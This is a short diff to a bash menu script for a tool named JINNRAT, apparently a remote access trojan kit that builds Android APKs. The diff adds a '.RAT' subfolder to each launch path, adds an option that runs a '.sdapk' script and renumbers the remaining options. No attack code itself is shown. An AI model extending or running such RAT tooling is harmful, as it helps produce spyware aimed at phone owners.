@@ -35,22 +35,32 @@ echo " "
    if [ $ch -eq 1 ];then
         cd $HOME
         cd JINNRAT
+        cd .RAT
         bash .JINN
 
         exit
     elif [ $ch -eq 2 ];then
         cd $HOME
         cd JINNRAT
+        cd .RAT
         bash .BuildAPK
 
         exit
     elif [ $ch -eq 3 ];then
         cd $HOME
         cd JINNRAT
+        cd .RAT
         bash .setup
 
         exit
     elif [ $ch -eq 4 ];then
+        cd $HOME
+        cd JINNRAT
+        cd .RAT
+        bash .sdapk
+
+        exit
+    elif [ $ch -eq 5 ];then
         echo -e "\e[1;34m Downloading Latest Files..."
         cd $HOME
         rm -rf JINNRAT
@@ -60,7 +70,7 @@ echo " "
         bash setup.sh
 
         exit
-    elif [ $ch -eq 5 ];then
+    elif [ $ch -eq 6 ];then
         echo -e 
         cd $HOME
 
